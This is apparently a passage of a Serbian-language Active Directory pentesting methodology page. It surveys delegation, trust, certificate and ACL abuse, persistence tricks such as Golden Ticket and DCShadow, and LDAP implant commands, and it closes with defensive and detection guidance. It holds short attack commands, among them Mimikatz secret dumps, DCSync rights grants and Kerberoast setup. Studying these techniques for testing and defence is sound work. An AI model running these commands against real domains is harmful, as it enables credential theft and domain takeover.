### Zloupotreba MSSQL-a i Trusted Links

Ako korisnik ima privilegije za **pristup MSSQL instancama**, mogao bi da ih koristi za **izvršavanje komandi** na MSSQL hostu (ako se izvršava kao SA), **krađu** NetNTLM **hash-a** ili čak izvođenje **relay** **attack-a**.\
Ako je MSSQL instanca trusted preko linka baze podataka od strane druge instance, korisnik sa privilegijama nad povezanom bazom mogao bi da **iskoristi odnos poverenja za izvršavanje upita na drugoj instanci**. Ovi odnosi poverenja mogu se ulančavati i na kraju dovesti do pogrešno konfigurisane baze podataka na kojoj korisnik može da izvršava komande.\
**Linkovi između baza podataka funkcionišu čak i preko forest trust-ova.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba IT asset/deployment platformi

Third-party inventory i deployment suite-ovi često otvaraju moćne puteve do credential-a i code execution-a. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domain privilegije na računaru, moći ćete da iz memorije izvučete TGT-ove svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da izvučete njegov TGT i da se impersonate-ujete koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation-u, mogli biste čak i da **automatski kompromitujete Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen "Constrained Delegation", on će moći da se **impersonate-uje kao bilo koji korisnik radi pristupa određenim servisima na računaru**.\
Zatim, ako **kompromitujete hash** ovog korisnika/računara, moći ćete da se **impersonate-ujete kao bilo koji korisnik** (čak i kao domain admin) radi pristupa određenim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posedovanje **WRITE** privilegije nad Active Directory objektom udaljenog računara omogućava sticanje code execution-a sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zloupotreba Permissions/ACLs

Kompromitovani korisnik može imati neke **zanimljive privilegije nad određenim domain objektima** koje bi vam mogle omogućiti kasnije **lateralno kretanje**/**eskalaciju** privilegija.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zloupotreba Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domena može se **zloupotrebiti** za **pribavljanje novih credential-a** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zloupotreba third-party sesija

Ako **drugi korisnici** **pristupe** **kompromitovanoj** mašini, moguće je **prikupiti credential-e iz memorije** i čak **ubaciti beacon-e u njihove procese** radi impersonation-a.\
Korisnici sistemu obično pristupaju preko RDP-a, pa ovde možete pronaći kako da izvedete nekoliko attack-a nad third-party RDP sesijama:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **lokalnom Administrator lozinkom** na računarima pridruženim domenu, tako što osigurava da ona bude **nasumična**, jedinstvena i često **menjana**. Ove lozinke se čuvaju u Active Directory-ju, a pristup se kontroliše pomoću ACL-ova, samo za ovlašćene korisnike. Uz dovoljne dozvole za pristup ovim lozinkama, moguće je pivoting-om preći na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Krađa sertifikata

**Prikupljanje sertifikata** sa kompromitovane mašine može biti način za eskalaciju privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Zloupotreba Certificate Templates

Ako su konfigurisani **vulnerable templates**, moguće je zloupotrebiti ih za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation sa nalogom visokih privilegija

### Dumping Domain Credentials

Kada dobijete privilegije **Domain Admin-a** ili, još bolje, **Enterprise Admin-a**, možete da izvršite **dump** **domain baze podataka**: _ntds.dit_.

[**Više informacija o DCSync attack-u možete pronaći ovde**](dcsync.md).

[**Više informacija o načinu krađe NTDS.dit-a možete pronaći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kao Persistence

Neke od prethodno razmatranih tehnika mogu se koristiti za persistence.\
Na primer, mogli biste da:

- Učinite korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učinite korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodelite [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** kreira **legitiman Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC naloga**). Ovaj metod se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da napadač dobije pristup **NTLM hash-u krbtgt naloga** u Active Directory (AD) okruženju. Ovaj nalog je poseban zato što se koristi za potpisivanje svih **Ticket Granting Ticket-ova (TGT-ova)**, koji su neophodni za autentifikaciju unutar AD mreže.

Kada napadač pribavi ovaj hash, može da kreira **TGT-ove** za bilo koji nalog po izboru (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Oni su slični golden ticket-ima, ali su falsifikovani tako da **zaobilaze uobičajene mehanizme za detekciju golden ticket-a.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence naloga pomoću sertifikata**

**Posedovanje sertifikata naloga ili mogućnost njihovog zahtevanja** predstavlja veoma dobar način za održavanje persistence-a na korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence domena pomoću sertifikata**

**Korišćenjem sertifikata takođe je moguće održavati persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory-ju obezbeđuje bezbednost **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na te grupe, kako bi se sprečile neovlašćene izmene. Međutim, ova funkcija može biti zloupotrebljena; ako napadač izmeni ACL objekta AdminSDHolder tako da običnom korisniku dodeli potpun pristup, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova bezbednosna mera, namenjena zaštiti, može se tako obiti o glavu i omogućiti neovlašćen pristup ako se pažljivo ne nadgleda.

[**Više informacija o AdminDSHolder Group možete pronaći ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller-a (DC-a)** postoji nalog **lokalnog administratora**. Dobijanjem admin prava na takvoj mašini, lokalni Administrator hash može se izvući pomoću alata **mimikatz**. Nakon toga je potrebna izmena registra kako bi se **omogućila upotreba ove lozinke**, čime se omogućava remote pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** određene **posebne dozvole** **korisniku** nad određenim domain objektima, što će korisniku omogućiti da **u budućnosti eskalira privilegije**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor-i** se koriste za **čuvanje** **dozvola** koje **objekat** ima **nad** nekim **objektom**. Ako možete da napravite samo **malu izmenu** u **security descriptor-u** objekta, možete dobiti veoma zanimljive privilegije nad tim objektom, bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Zloupotrebite pomoćnu klasu `dynamicObject` za kreiranje kratkotrajnih principal-a/GPO-ova/DNS zapisa sa `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstone-ova, uklanjajući LDAP dokaze, ali ostavljajući orphan SID-ove, pokvarene `gPLink` reference ili keširane DNS odgovore (npr. zagađenje AdminSDHolder ACE-ovima ili zlonamerne `gPCFileSysPath`/AD-integrisane DNS redirekcije).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji kako biste uspostavili **univerzalnu lozinku**, čime se omogućava pristup svim domain nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Ovde saznajte šta je SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati **sopstveni SSP** za **hvatanje** credential-a korišćenih za pristup mašini u **clear text** obliku.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

On registruje **novi Domain Controller** u AD-u i koristi ga za **upis atributa** (SIDHistory, SPN-ova...) na navedene objekte, a da pritom ne ostavlja nikakve **logove** o tim **izmenama**. Potrebne su vam DA privilegije i morate biti unutar **root domena**.\
Imajte na umu da će se, ako koristite pogrešne podatke, pojaviti veoma ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo govorili o tome kako da eskalirate privilegije ako imate **dovoljno dozvola za čitanje LAPS lozinki**. Međutim, ove lozinke mogu se koristiti i za **održavanje persistence-a**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft smatra da je **Forest** bezbednosna granica. To znači da **kompromitovanje jednog domena potencijalno može dovesti do kompromitovanja čitavog Forest-a**.<sup>[[1]](#references)</sup>

### Osnovne informacije

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji korisniku iz jednog **domena** omogućava pristup resursima u drugom **domenu**. On u suštini stvara vezu između sistema za autentifikaciju dva domena, omogućavajući nesmetan protok provera autentifikacije. Kada domeni uspostave trust, oni razmenjuju i čuvaju određene **ključeve** unutar svojih **Domain Controller-a (DC-ova)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domenu**, prvo mora da zatraži poseban ticket, poznat kao **inter-realm TGT**, od DC-a svog domena. Ovaj TGT je enkriptovan pomoću deljenog **ključa** oko kog su se oba domena usaglasila. Korisnik zatim prosleđuje ovaj TGT **DC-u trusted domena** kako bi dobio service ticket (**TGS**). Nakon uspešne validacije inter-realm TGT-a od strane DC-a trusted domena, on izdaje TGS, čime korisniku odobrava pristup servisu.

**Koraci**:

1. **Klijentski računar** u **Domenu 1** započinje proces koristeći svoj **NTLM hash** za zahtev za **Ticket Granting Ticket (TGT)** od svog **Domain Controller-a (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim zahteva **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domenu 2**.
4. Inter-realm TGT je enkriptovan pomoću **trust ključa** koji dele DC1 i DC2 u okviru dvosmernog domain trust-a.
5. Klijent prenosi inter-realm TGT na **Domain Controller (DC2) Domena 2**.
6. DC2 verifikuje inter-realm TGT koristeći deljeni trust ključ i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domenu 2 kojem klijent želi da pristupi.
7. Na kraju, klijent prosleđuje ovaj TGS serveru, koji je enkriptovan hash-om naloga servera, kako bi dobio pristup servisu u Domenu 2.

### Različiti trust-ovi

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernoj opciji, oba domena veruju jedan drugom, dok će u **jednosmernom** odnosu jedan domen biti **trusted**, a drugi **trusting** domen. U poslednjem slučaju, **moći ćete da pristupate resursima unutar trusting domena samo iz trusted domena**.

Ako Domain A veruje Domain B-u, A je trusting domen, a B je trusted domen. Pored toga, u **Domenu A** ovo bi bio **Outbound trust**, a u **Domenu B** ovo bi bio **Inbound trust**.

**Različiti trusting odnosi**

- **Parent-Child Trusts**: Ovo je uobičajena postavka unutar istog forest-a, gde child domen automatski ima dvosmerni transitive trust sa parent domenom. To u suštini znači da zahtevi za autentifikaciju mogu nesmetano da prolaze između parent i child domena.
- **Cross-link Trusts**: Poznati i kao "shortcut trust-ovi", uspostavljaju se između child domena radi ubrzavanja referral procesa. U složenim forest-ovima, authentication referral-i obično moraju da putuju do forest root-a, a zatim nazad do ciljnog domena. Kreiranjem cross-link-ova put se skraćuje, što je naročito korisno u geografski distribuiranim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, međusobno nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft-ovoj dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust-ovi su korisni za pristup resursima u domenu izvan trenutnog forest-a koji nije povezan forest trust-om. Bezbednost se ojačava SID filtering-om kod external trust-ova.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novog tree root-a. Iako se ne sreću često, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i obezbeđujući dvosmernu transitivity. Više informacija može se pronaći u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a je dvosmerni transitive trust između dva forest root domena, a takođe primenjuje SID filtering radi unapređenja bezbednosti.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-kompatibilnim](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trust-ovi su nešto specijalizovaniji i namenjeni okruženjima koja zahtevaju integraciju sa Kerberos sistemima izvan Windows ekosistema.

#### Druge razlike u **trusting odnosima**

- Trust odnos takođe može biti **transitive** (A veruje B-u, B veruje C-u, pa A veruje C-u) ili **non-transitive**.
- Trust odnos može biti postavljen kao **bidirectional trust** (oba domena veruju jedan drugom) ili kao **one-way trust** (samo jedan domen veruje drugom).

### Attack Path

1. **Enumerišite** trusting odnose
2. Proverite da li neki **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda preko ACE unosa ili članstva u grupama drugog domena. Potražite **odnose između domena** (trust je verovatno zbog toga i kreiran).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromitujte** **naloge** koji mogu da izvrše **pivot** kroz domene.

Napadači mogu pristupiti resursima u drugom domenu kroz tri osnovna mehanizma:

- **Local Group Membership**: Principals mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, čime dobijaju značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principals takođe mogu biti članovi grupa unutar foreign domena. Međutim, efikasnost ovog metoda zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principals mogu biti navedeni u **ACL-u**, naročito kao entiteti u **ACE-ovima** unutar **DACL-a**, čime im se obezbeđuje pristup određenim resursima. Za one koji žele da detaljnije prouče mehanizme ACL-ova, DACL-ova i ACE-ova, whitepaper pod nazivom “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” predstavlja neprocenjiv resurs.<sup>[[17]](#references)</sup>

### Pronalaženje external korisnika/grupa sa dozvolama

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. To će biti user/group iz **external domena/forest-a**.

Ovo možete proveriti u **Bloodhound-u** ili pomoću powerview-a:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju trustova domena:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedan za _Child --> Parent_ i drugi za _Parent_ --> _Child_.\
> Onaj koji koristi trenutni domen možete pronaći pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte na Enterprise admin nivo u child/parent domenu zloupotrebom trust-a putem SID-History injection-a:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje načina na koji Configuration Naming Context (NC) može biti iskorišćen od ključne je važnosti. Configuration NC služi kao centralno spremište konfiguracionih podataka u čitavoj forest strukturi u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar forest-a, pri čemu writable DC-ovi održavaju writable kopiju Configuration NC-a. Da bi se ovo iskoristilo, potrebno je imati **SYSTEM privilegije na DC-u**, po mogućnosti na child DC-u.

**Link GPO to root DC site**

Sites kontejner Configuration NC-a sadrži informacije o site-ovima svih računara pridruženih domenu unutar AD forest-a. Radom sa SYSTEM privilegijama na bilo kom DC-u, napadači mogu povezati GPO-ove sa root DC site-ovima. Ova radnja potencijalno kompromituje root domen manipulisanjem politikama koje se primenjuju na ove site-ove.

Za detaljnije informacije može se proučiti istraživanje o [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Jedan od vektora napada podrazumeva ciljanje privilegovanih gMSA naloga unutar domena. KDS Root key, ključan za izračunavanje lozinki gMSA naloga, čuva se u Configuration NC-u. Sa SYSTEM privilegijama na bilo kom DC-u moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA u čitavom forest-u.

Detaljna analiza i uputstva korak po korak dostupni su u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Dopunski delegirani MSA napad (BadSuccessor – zloupotreba migration atributa):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno eksterno istraživanje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Ovaj metod zahteva strpljenje i čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama napadač može izmeniti AD Schema kako bi bilo kom korisniku dodelio potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa i kontrole nad novokreiranim AD objektima.

Dodatno čitanje dostupno je u tekstu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad Public Key Infrastructure (PKI) objektima kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar forest-a. Pošto se PKI objekti nalaze u Configuration NC-u, kompromitovanje writable child DC-a omogućava izvršavanje ESC5 napada.

Više detalja dostupno je u tekstu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> U scenarijima bez ADCS-a, napadač može podesiti neophodne komponente, kao što je opisano u tekstu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je pouzdan** za eksterni domen, koji vam daje **neutvrđene dozvole** nad njim. Moraćete da pronađete **koji principi iz vašeg domena imaju koji nivo pristupa eksternom domenu**, a zatim pokušate da ga exploitujete:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni domen šume - jednosmerno (izlazno)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **dodeljuje** određene **privilegije** principalu iz **drugog domena**.

Međutim, kada je **domen trusted** od strane domena koji mu veruje, trusted domen **kreira korisnika** sa **predvidljivim imenom**, koji kao **lozinku koristi lozinku trusted domena**. To znači da je moguće **pristupiti korisniku iz domena koji veruje da bi se ušlo u trusted domen**, izvršiti njegovo enumerisanje i pokušati dodatno eskalirati privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način kompromitovanja trusted domena jeste pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom smeru** od domain trust odnosa, što nije naročito često.

Drugi način kompromitovanja trusted domena jeste čekanje na računaru na koji **korisnik iz trusted domena može da pristupi** kako bi se prijavio putem **RDP-a**. Napadač bi zatim mogao da ubaci kod u proces RDP sesije i da odatle **pristupi izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, napadač bi iz procesa **RDP sesije** mogao da sačuva **backdoors** u **startup folderu hard diska**. Ova tehnika se naziva **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe domain trust odnosa

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history preko forest trust odnosa ublažava se pomoću SID Filtering-a, koji je podrazumevano aktiviran na svim inter-forest trust odnosima. Ovo se zasniva na pretpostavci da su intra-forest trust odnosi bezbedni, pri čemu se forest, a ne domen, smatra bezbednosnom granicom, u skladu sa Microsoft-ovim stavom.
- Međutim, postoji problem: SID filtering može ometati aplikacije i korisnički pristup, zbog čega se povremeno deaktivira.

### **Selective Authentication:**

- Kod inter-forest trust odnosa, korišćenje Selective Authentication-a obezbeđuje da korisnici iz ta dva forest-a ne budu automatski autentifikovani. Umesto toga, potrebne su eksplicitne dozvole kako bi korisnici mogli da pristupe domenima i serverima unutar trusting domena ili forest-a.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja writable Configuration Naming Context-a (NC) niti od napada na trust account.

[**Više informacija o domain trust odnosima na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira bloodyAD-style LDAP primitive kao x64 Beacon Object Files koji se u potpunosti izvršavaju unutar on-host implanta (npr. Adaptix C2). Operateri kompajliraju paket pomoću `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim iz beacon-a pozivaju `ldap <subcommand>`. Sav saobraćaj koristi trenutni logon security context preko LDAP-a (389), uz signing/sealing, ili LDAPS-a (636), uz automatsko prihvatanje certificate-a, tako da nisu potrebni socks proxy-ji niti artefakti na disku.<sup>[[4]](#references)</sup>

### LDAP enumeration na strani implanta

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` razrešavaju kratka imena/OU putanje u pune DN-ove i izbacuju odgovarajuće objekte.
- `get-object`, `get-attribute` i `get-domaininfo` preuzimaju proizvoljne atribute (uključujući security descriptor-e), kao i forest/domain metapodatke iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` direktno iz LDAP-a prikazuju kandidate za roasting, delegation podešavanja i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptore.
- `get-acl` i `get-writable --detailed` analiziraju DACL kako bi izlistali trustee-je, prava (GenericAll/WriteDACL/WriteOwner/attribute writes) i inheritance, čime se odmah dobijaju ciljevi za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP primitive za upis za eskalaciju i persistence

- BOF-ovi za kreiranje objekata (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da pripremi nove principal-e ili account-e računara tamo gde postoje prava za OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju ciljeve kada se utvrde prava za upis svojstava.
- Komande usmerene na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, prevode WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinke, kontrolu članstva u grupama ili DCSync privilegije replikacije, bez ostavljanja PowerShell/ADSI artefakata. Njihovi `remove-*` pandani uklanjaju ubačene ACE-ove.

### Delegation, roasting i Kerberos abuse

- `add-spn`/`set-spn` odmah čine kompromitovanog user-a podobnim za Kerberoast; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez diranja password-a.
- Makroi za delegaciju (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flags ili `msDS-AllowedToActOnBehalfOfOtherIdentity` direktno iz beacon-a, omogućavajući constrained/unconstrained/RBCD attack paths i uklanjajući potrebu za remote PowerShell-om ili RSAT-om.

### sidHistory injection, premeštanje OU-ova i oblikovanje attack surface-a

- `add-sidhistory` ubacuje privilegovane SID-ove u SID history kontrolisanog principal-a (pogledajte [SID-History Injection](sid-history-injection.md)), obezbeđujući stealthy nasleđivanje pristupa u potpunosti preko LDAP/LDAPS-a.
- `move-object` menja DN/OU računara ili user-a, omogućavajući attacker-u da premesti asset-e u OU-ove gde već postoje delegirana prava, pre zloupotrebe `set-password`, `add-groupmember` ili `add-spn`.
- Strogo ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) omogućavaju brz rollback nakon što operator prikupi credentials ili persistence, uz svođenje telemetry-ja na minimum.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Neke opšte odbrane

[**Saznajte više o zaštiti credentials-a ovde.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Ograničenja za Domain Admins**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, čime se izbegava njihova upotreba na drugim host-ovima.
- **Privilegije Service Account-a**: Services ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama, kako bi se održala bezbednost.
- **Vremensko ograničavanje privilegija**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. To se može postići pomoću: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Pratite Event ID-jeve 2889/3074/3075, a zatim nametnite LDAP signing i LDAPS channel binding na DC-ovima/klijentima kako biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ako želite da detektujete uobičajeni AD tradecraft, **nemojte se oslanjati samo na artefakte pod kontrolom operatora**, kao što su preimenovani binaries, service names, privremeni batch fajlovi ili output paths. Uspostavite baseline načina na koji legitimni Windows klijenti generišu [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI saobraćaj, a zatim tražite **implementation quirks** koji ostaju čak i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ili `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (nakon validacije u odnosu na sopstveni baseline):
- Autentifikovani DCE/RPC koji koristi `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding popunjen vrednošću `0xff`
- LDAP Kerberos bind-ovi koji postavljaju raw Kerberos `AP-REQ` direktno u SPNEGO `mechToken`
- SMB2/3 negotiate zahtevi sa ASCII-looking `ClientGuid` vrednostima
- WMI `IWbemLevel1Login::NTLMLogin` koji koristi nestandardni namespace `//./root/cimv2`
- Hardcoded Kerberos nonce vrednosti
- **Bolje kao correlation/scoring features**:
- Sparse ili duplicirane Kerberos etype liste, neuobičajeni/nedostajući `PA-DATA` ili TGS-REQ etype ordering koji se razlikuje od nativnog Windows-a
- NTLM Type 1 poruke bez version info-a ili Type 3 poruke sa null host names
- Raw NTLMSSP prenet u DCE/RPC umesto kroz SPNEGO, nedostajući DCE/RPC verification trailers ili SPNEGO/Kerberos OID mismatches
- Više ovih osobina sa istog host-a/user-a/session-a/time window-a mnogo je jači signal od bilo kog pojedinačnog slabog polja
- **Koristite kao enrichment, ne kao standalone alerts**:
- Podrazumevani filenames, output paths, random service names, privremena batch names, podrazumevana imena computer account-a i tool-specific HTTP/WebDAV/RDP/MSSQL strings
